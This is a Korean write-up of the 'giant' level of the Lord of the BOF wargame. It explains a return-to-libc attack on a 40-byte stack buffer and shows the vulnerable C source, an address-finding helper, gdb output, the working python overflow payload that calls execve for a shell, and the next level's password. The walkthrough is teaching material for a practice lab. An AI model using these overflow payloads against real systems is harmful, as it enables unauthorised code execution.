# giant

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - giant
        - RTL2
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(int argc, char *argv[])
{
        char buffer[40];
        FILE *fp;
        char *lib_addr, *execve_offset, *execve_addr;
        char *ret;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // gain address of execve
        fp = popen("/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "(%x)", &lib_addr);
        fclose(fp);

        fp = popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "%x", &execve_offset);
        fclose(fp);

        execve_addr = lib_addr + (int)execve_offset;
        // end

        memcpy(&ret, &(argv[1][44]), 4);
        if(ret != execve_addr)
        {
                printf("You must use execve!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

처음 봤을 때 이게 뭔가 싶은 것들이 잔뜩 있었다. 하나씩 알아가보기엔 시간이 없음으로 write-up을 보면서 기능에 대해서만 공부하고 넘어가도록 하자.

popen은 파이프에 대한 함수이다. 안에서 일어난 명령어의 결과를 출력으로 전달해준다.

그럼 popen의 인자로 있는 명령어가 실행되는 것인지 확인해보자.

```bash
[bugbear@localhost bugbear]$ /usr/bin/ldd /home/giant
ldd: /home/giant: No such file or directory
```

파일을 만들거나 보는 것 전부 권한이 없기때문에 현재 디렉토리에 대해서 실행보자.

```bash
[bugbear@localhost bugbear]$ /usr/bin/ldd /home/bugbear/giant
        libc.so.6 => /lib/libc.so.6 (0x40018000)
        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[bugbear@localhost bugbear]$ /usr/bin/ldd /home/bugbear/giant | /bin/grep libc
        libc.so.6 => /lib/libc.so.6 (0x40018000)
[bugbear@localhost bugbear]$ /usr/bin/nm /lib/libc.so.6 | /bin/grep __execve
00091d48 t __execve
```

정상적으로 실행되는 것을 확인된다. 여기서는 ldd와  grep, nm에 대해서 알아야하는데 나중에 따로 정리하겠다.

이를 통해서 우리는 libc의 execve 주소를 알 수 있게 되었다. 주소는 0x400A9D48‬이다. 

이것은 이 방법뿐 아니라 copy를 뜬 giant 파일에서 print execve를 통해서도 같은 값이 나오는 것을 알 수 있다.

이제 ret에 execve를 덥고 RTL을 이용해 execve를 부른다.  

execve 함수는 인자로 명령어주소,  명령어주소의 주소, 환경변수 주소를 받기 때문에 귀찮은 일이 많아진다. 

함수를 통해 실행하고자 하는 건 /bin/sh이기 때문에 /bin/sh의 주소를 구하고 심볼릭 링크를 이용해서 명령어주소의 주소를 구하고 환경변수는 NULL값을 줘도 되므로 NULL값의 주소를 구한다. 

```bash
[bugbear@localhost bugbear]$ cat find.c
#include <stdio.h>
int main(){
        long system=0x40058ae0;
        while(memcmp((void*)system,("/bin/sh"),8)){
                system++;
        }
        printf("%p\n",system);
}
[bugbear@localhost bugbear]$ ./find
0x400fbff9
[bugbear@localhost bugbear]$ ln -s aaaaa `python -c 'print "\xf9\xbf\x0f\x40"'`
[bugbear@localhost bugbear]$ ls
aaaaa  find  find.c  giant  giant.c  ▒?@
[bugbear@localhost bugbear]$ gdb -q `python -c 'print "\xf9\xbf\x0f\x40"'`
(gdb)...(생략)
(gdb)
0xbfffff93:      "HOME=/home/bugbear"
0xbfffffa6:      "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/bugbear/bin"
0xbfffffe9:      "/home/bugbear/▒\017@"
0xbffffffc:      ""
0xbffffffd:      ""
```

/bin/sh의 주소는 0x400fbff9

/bin/sh의 주소의 주소는 0xbfffffe9

NULL의 주소는 0xbffffffc 이다.

이제 payload를 작성해서 공격해 보자. 

```bash
[bugbear@localhost bugbear]$ ./`python -c 'print "\xf9\xbf\x0f\x40"'` "`python -          c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\xe9\xff\xff\          xbf"+"\xfc\xff\xff\xbf"'`"
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒H▒
@▒▒▒▒▒@▒▒▒▒▒▒▒▒
Segmentation fault
```

여러 방면으로 시도해보았지만 아무것도 되지 않는다. 그래서 일단 공격방법에 대한 이해를 했다고 생각하고 넘어가야할 것 같다. write-up에서 본 내 payload와 가장 비슷한 것으로 공격했다.

```bash
[bugbear@localhost bugbear]$ ./giant "`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\xf8\xfa\xff\xbf"+"\xfc\xfa\xff\xbf"+"BBBB"*14+"\xf9\xbf\x0f\x40"'`"
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒H▒
@▒▒▒▒▒@▒▒▒▒▒▒▒▒BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB▒@
bash$ whoami
giant
bash$ my-pass
euid = 514
one step closer
bash$
```

bugbear의 password는 one step closer이다.